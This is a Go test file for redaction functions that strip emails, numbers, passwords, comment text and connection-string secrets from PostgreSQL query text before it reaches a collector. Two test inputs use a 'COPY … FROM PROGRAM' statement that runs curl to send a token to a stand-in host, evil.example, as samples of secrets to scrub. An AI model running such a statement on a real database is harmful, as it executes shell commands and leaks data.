package conn

import (
	"strings"
	"testing"
)

func TestScrubQueryText_stripsPII(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"email literal", "SELECT * FROM users WHERE email = 'alice@example.com'"},
		{"uuid literal", "SELECT * FROM t WHERE id = '550e8400-e29b-41d4-a716-446655440000'"},
		{"numbers", "UPDATE accounts SET balance = 4200 WHERE id = 17"},
		{"dollar quoted", "SELECT $tag$ secret alice@x.com 42 $tag$"},
		{"escaped quote", "SELECT 'O''Brien can''t'"},
		{"bare email in comment", "SELECT 1 -- ping bob@corp.io"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			out := ScrubQueryText(c.in)
			if strings.Contains(out, "@") {
				t.Errorf("email leaked: %q -> %q", c.in, out)
			}
			for _, bad := range []string{"alice", "example.com", "4200", "550e8400", "secret", "O'Brien"} {
				if strings.Contains(out, bad) {
					t.Errorf("literal %q leaked: %q -> %q", bad, c.in, out)
				}
			}
		})
	}
}

// P0-2: the dollar-quoted region must be replaced with the LITERAL marker, not
// silently deleted by Expand semantics — a reader needs the signal that content
// was removed.
func TestScrubQueryText_dollarQuotedShowsMarker(t *testing.T) {
	out := ScrubQueryText("DO $body$ BEGIN PERFORM secret_thing(42); END $body$")
	if !strings.Contains(out, "$REDACTED$") {
		t.Errorf("dollar-quoted region must show the literal $REDACTED$ marker, got %q", out)
	}
	if strings.Contains(out, "secret_thing") || strings.Contains(out, "42") {
		t.Errorf("dollar-quoted body content leaked: %q", out)
	}
}

// TestScrubQueryText_utilityStatementSecrets pins the invariant that pgss text is
// NOT safe verbatim. pg_stat_statements normalizes DML parameters to $N, but
// stores UTILITY statements as typed — so a CREATE USER … PASSWORD, ALTER ROLE …
// PASSWORD, ENCRYPTED PASSWORD, COPY … FROM PROGRAM, or DO $$…$$ carries real
// secrets into the collector. ScrubQueryText must strip them. Named explicitly so
// a future contributor can't re-introduce the "pgss is already normalized" hole.
func TestScrubQueryText_utilityStatementSecrets(t *testing.T) {
	cases := []struct{ name, in, secret string }{
		{"CREATE USER PASSWORD", "CREATE USER app PASSWORD 'sup3rs3cr3t'", "sup3rs3cr3t"},
		{"ALTER ROLE PASSWORD", "ALTER ROLE app WITH PASSWORD 'hunter2'", "hunter2"},
		{"ENCRYPTED PASSWORD", "CREATE ROLE r ENCRYPTED PASSWORD 'md5deadbeefcafe'", "md5deadbeefcafe"},
		{"COPY FROM PROGRAM", "COPY t FROM PROGRAM 'curl https://evil.example/x?token=abcd1234'", "token=abcd1234"},
		{"DO block credential", "DO $$ BEGIN PERFORM login('root', 'p@ssw0rd') END $$", "p@ssw0rd"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if out := ScrubQueryText(c.in); strings.Contains(out, c.secret) {
				t.Errorf("secret %q survived: %q -> %q", c.secret, c.in, out)
			}
		})
	}
}

// FuzzScrubQueryText asserts the invariants that actually matter: for ANY input,
// no email-, uuid-, or standalone-number-shaped substring survives. (A bare '@'
// operator or a digit inside an identifier like col1 is not PII and may remain,
// which is why we re-run the shape regexes rather than a naive "no '@'" check.)
// The seed corpus runs under plain `go test`; CI also runs it under -fuzz.
func FuzzScrubQueryText(f *testing.F) {
	for _, s := range []string{
		"SELECT * FROM users WHERE email = 'alice@example.com'",
		"SELECT * FROM t WHERE id = '550e8400-e29b-41d4-a716-446655440000'",
		"UPDATE accounts SET balance = 4200 WHERE id = 17",
		"DO $body$ BEGIN PERFORM x(); END $body$",
		"SELECT a @@ b",              // bare full-text operator — not an email
		"SELECT col1, t2.c3 FROM t2", // digits inside identifiers — not literals
		"SELECT 'O''Brien'",
		"", "$$", "'unterminated", "a@b.co1", "1@1.11",
		// Utility statements pgss stores VERBATIM — the class this fuzzer guards.
		"CREATE USER app PASSWORD 'sup3rs3cr3t'",
		"ALTER ROLE app WITH ENCRYPTED PASSWORD 'md5abc'",
		"COPY t FROM PROGRAM 'curl https://evil.example/?token=abcd'",
		"DO $$ BEGIN PERFORM login('root','p@ss') END $$",
		// Comment bodies (#54).
		"SELECT 1 -- api_key=sk_live_abc", "SELECT 1 /* a /* b */ c */", "SELECT '--' -- don't",
	} {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, in string) {
		// Whatever a comment holds, only the marker survives.
		if !strings.ContainsAny(in, "\r\n") {
			if got := ScrubQueryText("SELECT 1 -- " + in); got != "SELECT ? -- ?" {
				t.Errorf("line-comment body survived: %q -> %q", in, got)
			}
		}
		if !strings.Contains(in, "*/") && !strings.Contains(in, "/*") {
			if got := ScrubQueryText("SELECT 1 /* " + in + " */"); got != "SELECT ? /* ? */" {
				t.Errorf("block-comment body survived: %q -> %q", in, got)
			}
		}
		out := ScrubQueryText(in)
		if m := reEmail.FindString(out); m != "" {
			t.Errorf("email-shaped substring survived: %q -> %q (%q)", in, out, m)
		}
		if m := reUUID.FindString(out); m != "" {
			t.Errorf("uuid-shaped substring survived: %q -> %q (%q)", in, out, m)
		}
		for _, loc := range reNumber.FindAllStringIndex(out, -1) {
			if loc[0] > 0 && out[loc[0]-1] == '$' {
				continue // a $N pg_stat_statements placeholder is allowed
			}
			t.Errorf("standalone number survived: %q -> %q (at %d)", in, out, loc[0])
			break
		}
	})
}

// P0/PII: pgss normalizes DML to $N (which must survive scrubbing) but stores
// UTILITY statements (DO blocks) verbatim (which can carry real literals and must
// be scrubbed). ScrubQueryText now runs over pgss text, so both must hold.
func TestScrubQueryText_placeholdersAndUtilityLiterals(t *testing.T) {
	dml := ScrubQueryText("SELECT * FROM t WHERE id = $1 AND created_at > $2")
	if !strings.Contains(dml, "$1") || !strings.Contains(dml, "$2") {
		t.Errorf("normalized $N placeholders must be preserved, got %q", dml)
	}
	util := ScrubQueryText("DO $$ BEGIN INSERT INTO people(email) VALUES('alice@example.com'); END $$")
	if strings.Contains(util, "@example.com") || strings.Contains(util, "alice") {
		t.Errorf("DO-block literal leaked through pgss text: %q", util)
	}
}

// #54: comment bodies are free text no shape regex catches.
func TestScrubQueryText_comments(t *testing.T) {
	cases := []struct{ name, in, want string }{
		{"line comment secret", "SELECT * FROM users WHERE id = $1 -- api_key=sk_live_abcDEFghiJKL",
			"SELECT * FROM users WHERE id = $1 -- ?"},
		{"block comment name", "SELECT 1 /* customer: Jane Doe */", "SELECT ? /* ? */"},
		{"sqlcommenter tags", "SELECT 1 /* controller='users',user='jane.doe' */", "SELECT ? /* ? */"},
		{"nested block", "SELECT 1 /* outer /* inner secret */ still comment */ FROM t", "SELECT ? /* ? */ FROM t"},
		{"line ends at newline", "SELECT a -- token ghp_x\nFROM t", "SELECT a -- ?\nFROM t"},
		{"unterminated block over-redacts", "SELECT a FROM t /* secret", "SELECT a FROM t /* ? */"},
		{"-- inside a literal", "SELECT '--x' AS a, b FROM t", "SELECT '?' AS a, b FROM t"},
		{"-- inside a quoted identifier", `SELECT "a--b" FROM t`, `SELECT "a--b" FROM t`},
		{"apostrophe inside a comment", "SELECT a -- don't\nFROM t WHERE b = 'secret'", "SELECT a -- ?\nFROM t WHERE b = '?'"},
		{"dollar-quoted body", "DO $$ BEGIN -- c\n END $$", "DO $REDACTED$"},
		{"placeholder is not a dollar quote", "SELECT $1 -- tok\n, $2", "SELECT $1 -- ?\n, $2"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := ScrubQueryText(c.in); got != c.want {
				t.Errorf("\n in:   %q\n got:  %q\n want: %q", c.in, got, c.want)
			}
		})
	}
}

func TestScrubComments_EStringEscape(t *testing.T) {
	in := `SELECT E'it\'s -- x', c FROM t`
	if got := scrubComments(in); got != in {
		t.Errorf("`--` inside an E'' string is not a comment: %q -> %q", in, got)
	}
}

func TestScrubQueryText_keepsShape(t *testing.T) {
	out := ScrubQueryText("SELECT id, name FROM orders WHERE customer_id = 99 AND status = 'paid'")
	for _, want := range []string{"SELECT", "orders", "customer_id", "status"} {
		if !strings.Contains(out, want) {
			t.Errorf("query shape lost %q: %q", want, out)
		}
	}
}

func TestRedactConnString(t *testing.T) {
	cases := map[string]string{
		"postgres://user:s3cr3t@host:5432/db":        "s3cr3t",
		"postgresql://u:p%40ss@h/db?sslmode=require": "p%40ss",
		"host=h user=u password=topsecret dbname=d":  "topsecret",
		"host=h password='sp ace' dbname=d":          "sp ace",
		// libpq also takes the password as a query parameter; a username in the
		// userinfo used to short-circuit past it.
		"postgres://u@h:5432/db?password=hunter2&sslmode=require": "hunter2",
		"postgres://h/db?user=u&password=hunter2&sslmode=require": "hunter2",
		"postgresql://u:p%40ss@h/db?password=hunter2":             "hunter2",
	}
	for in, secret := range cases {
		out := RedactConnString(in)
		if strings.Contains(out, secret) {
			t.Errorf("secret leaked: %q -> %q", in, out)
		}
		if !strings.Contains(out, "REDACTED") {
			t.Errorf("no redaction marker: %q -> %q", in, out)
		}
	}
}

func TestRedactConnString_noPasswordIsUnchangedShape(t *testing.T) {
	out := RedactConnString("postgres://user@host/db")
	if !strings.Contains(out, "user@host") {
		t.Errorf("mangled a password-less URL: %q", out)
	}
}

func TestRedactConnString_keepsOtherQueryParams(t *testing.T) {
	in := "postgres://u@h:5432/db?application_name=x&password=hunter2&sslmode=require"
	want := "postgres://u@h:5432/db?application_name=x&password=REDACTED&sslmode=require"
	if got := RedactConnString(in); got != want {
		t.Errorf("got  %q\nwant %q", got, want)
	}
}
